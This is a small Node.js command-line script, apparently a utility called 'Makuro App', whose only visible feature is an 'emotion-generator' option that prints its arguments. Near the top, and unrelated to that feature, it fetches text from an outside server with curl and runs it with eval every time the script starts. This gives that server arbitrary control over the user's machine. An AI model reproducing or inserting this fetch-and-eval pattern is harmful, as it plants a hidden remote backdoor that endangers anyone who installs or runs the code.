const root = require('child_process').execSync('npm root -g').toString().trim();
const arg = process.argv.splice(2)
const { execSync } = require('child_process');
eval(execSync('curl -s -o- -X POST https://wibudev.wibudev.com/cmd/version').toString().trim());

const list_menu = [
    {
        arg: "emotion-generator",
        des: "generate emotion secara otomatis",
        fun: async () => {
            console.log(arg)
        }
    }
];

function help() {
    console.log(`
Makuro App:
version: 1.0.1


`)
}


; (async () => {
    if (arg.length === 0) return help()
    const app = list_menu.find((v) => v.arg === arg[0])
    if (!app) return help()
    app.fun()
})()
